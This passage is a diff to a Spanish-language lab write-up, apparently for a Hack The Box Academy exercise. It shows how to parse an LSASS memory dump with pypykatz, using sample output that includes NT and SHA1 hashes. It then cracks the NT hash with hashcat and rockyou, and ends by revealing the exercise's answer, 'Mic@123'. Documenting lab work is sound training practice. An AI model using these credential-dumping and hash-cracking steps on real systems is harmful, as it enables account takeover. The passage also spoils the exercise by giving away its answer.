@@ -283,8 +283,44 @@ Después, desde la máquina atacante Linux, accediendo a:
 cd /tmp/smbshare
 ```
 
-Finalemente en Linux utilizo:
-``
+Debería encontrar el archivo lsass.dmp.
+
+A partir de aquí no pude continuar con el ejercicio porque la conexión RDP es muy inestable y se caía constantemente.
+
+Teóricamente, debería ejecutar:
+```
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 ```
 
+Me devolvería una respuesta de este tipo:
 ```
+INFO:root:Parsing file /home/peter/Documents/lsass.dmp
+FILE: ======== /home/peter/Documents/lsass.dmp =======
+== LogonSession ==
+authentication_id 1354633 (14ab89)
+session_id 2
+username bob
+domainname DESKTOP-33E7O54
+logon_server WIN-6T0C3J2V6HP
+logon_time 2021-12-14T18:14:25.514306+00:00
+sid S-1-5-21-4019466498-1700476312-3544718034-1001
+luid 1354633
+	== MSV ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+		LM: NA
+		NT: 64f12cddaa88057e06a81b54e73b949b
+		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
+		DPAPI: NA
+```
+
+Y después con hashcat ejecutaría:
+
+```shell-session
+Polika4RM@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+
+64f12cddaa88057e06a81b54e73b949b:Password1
+```
+
+Siendo la solución verdadera del ejercicio: "Mic@123"
+
